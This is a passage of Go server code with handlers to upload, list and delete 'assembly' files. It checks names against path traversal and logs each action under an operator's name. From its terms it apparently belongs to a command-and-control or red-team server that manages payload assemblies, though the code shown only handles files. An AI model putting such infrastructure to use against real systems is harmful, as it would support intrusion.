	if err := parseMultipartLimited(w, r, maxAssemblyBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)
	name := r.FormValue("name")
	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
		http.Error(w, "invalid name", http.StatusBadRequest)
		return
	}
	file, _, err := r.FormFile("assembly")
	if err != nil {
		http.Error(w, "missing assembly file", http.StatusBadRequest)
		return
	}
	defer file.Close()
	data, err := readFormFileLimited(file, maxAssemblyFileBytes)
	if err != nil {
		if errors.Is(err, errFileTooLarge) {
			http.Error(w, "assembly too large", http.StatusRequestEntityTooLarge)
			return
		}
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}
	if err := os.WriteFile(filepath.Join(h.assemblyDir(), name), data, 0600); err != nil {
		http.Error(w, "write error", http.StatusInternalServerError)
		return
	}
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("assembly", fmt.Sprintf("operator '%s' uploaded assembly: %s (%d bytes)", op, name, len(data)))
	if entry, err := libraryEntryFromFile("assembly", name, h.assemblyDir()); err == nil {
		h.hub.Publish("library", "add", entry)
	}
	json.NewEncoder(w).Encode(map[string]interface{}{"name": name, "size": len(data)})
}

func (h *Handler) HandleAssemblyList(w http.ResponseWriter, r *http.Request) {
	entries, _ := os.ReadDir(h.assemblyDir())
	type asmEntry struct {
		Name string `json:"name"`
		Size int64  `json:"size"`
	}
	var list []asmEntry
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		list = append(list, asmEntry{Name: e.Name(), Size: info.Size()})
	}
	if list == nil {
		list = []asmEntry{}
	}
	json.NewEncoder(w).Encode(list)
}

func (h *Handler) HandleAssemblyDelete(w http.ResponseWriter, r *http.Request) {
	name := r.PathValue("name")
	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
		http.Error(w, "invalid name", http.StatusBadRequest)
		return
	}
	path := filepath.Join(h.assemblyDir(), name)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	os.Remove(path)
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("assembly", fmt.Sprintf("operator '%s' deleted assembly: %s", op, name))
	h.hub.Publish("library", "delete", map[string]interface{}{"name": name, "kind": "assembly"})
	w.WriteHeader(http.StatusNoContent)
}
